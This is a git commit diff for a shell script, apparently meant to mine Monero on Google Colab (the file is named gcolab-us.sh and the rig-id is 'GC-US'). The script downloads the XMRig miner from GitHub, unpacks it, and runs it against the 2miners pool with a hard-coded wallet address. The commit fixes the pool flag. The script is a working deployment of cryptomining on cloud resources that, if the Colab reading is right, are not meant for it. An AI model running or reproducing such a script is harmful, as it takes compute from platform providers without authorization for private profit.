f204826b726c63d758b65ae3dcc3e69b475e371d
quynhanh9193 <nguyentuananhbmt93@gmail.com>
2022-03-19 12:19:37 +0700

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
 tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
-./xmrig xmr.2miners.com:2222 -u 86YpJLSXK3873T9jLTstg1aa4pLNZqVnfJfTTUGMyiYMWdWh2Ld2zc8VSu9PnQSstUAef1mJ3beXy7Rmm1diGNhDJmmKWNu -k --tls --rig-id GC-US
+./xmrig -o xmr.2miners.com:2222 -u 86YpJLSXK3873T9jLTstg1aa4pLNZqVnfJfTTUGMyiYMWdWh2Ld2zc8VSu9PnQSstUAef1mJ3beXy7Rmm1diGNhDJmmKWNu -k --tls --rig-id GC-US
